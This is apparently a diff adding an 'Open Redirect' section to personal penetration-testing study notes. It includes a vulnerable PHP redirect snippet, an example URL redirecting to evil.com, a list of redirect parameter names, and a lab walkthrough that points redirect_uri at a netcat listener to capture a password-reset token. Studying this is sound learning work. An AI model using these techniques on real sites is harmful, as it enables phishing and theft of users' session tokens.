@@ -746,3 +746,61 @@ sometimes the referrer has a whitelist regex or a regex that allows one specific
 
 for example if the referrer header is checking for "google.com" then we could try something like "google.com.pwned.m3", "pwned.m3?www.google.com", or "pwned.m3/www.google.com" 
 
+## Open Redirect 
+
+an open redirect vulnerability is when an attacker can redirect a victim to an attacker-controlled site by abusing a legit app's redirection functionality 
+
+```php
+$red = $_GET['url'];
+header("Location: " . $red);
+```
+
+the above code will use a url parameter without any validation to put in the response header for the url to redirect the page to 
+
+an attacker can abuse this lack of validation with a url like: 
+
+`trusted.site/index.php?url=https://evil.com`
+
+always make sure to look for these types of parameters which can look like: 
+
+- ?url=
+- ?link=
+- ?redirect=
+- ?redirecturl=
+- ?redirect_uri=
+- ?return=
+- ?return_to=
+- ?returnurl=
+- ?go=
+- ?goto=
+- ?exit=
+- ?exitpage=
+- ?fromurl=
+- ?fromuri=
+- ?redirect_to=
+- ?next=
+- ?newurl=
+- ?redir=
+
+### Open redirect example 
+
+in our target we can see a url with a `redirect_uri` parameter: 
+
+![](Images/Pasted%20image%2020240306105716.png)
+
+a token is also used when using the reset password functionality and is making a POST request to the page specified by the `redirect_uri` parameters: 
+
+![](Images/Pasted%20image%2020240306105842.png)
+
+we can test if this is vulnerable to open redirect by inserting our own netcat hosted IP and port into the redirect parameter: 
+
+`oredirect.htb.net/?redirect_uri=http://10.10.15.245:1337&token=mlf2bhmj3cg29rv689lm92jhu3`
+
+then in a new incognito window we can simulate the victim by going to our malicious link and using the site functionality which will generate a response on our netcat listener: 
+
+![](Images/Pasted%20image%2020240306110535.png)
+
+open redirect vulnerabilities are usually used to create legit-looking phishing URLs as well as what we just saw to steal valid user session tokens 
+
+remember that this attack would have worked against a GET based form as well 
+
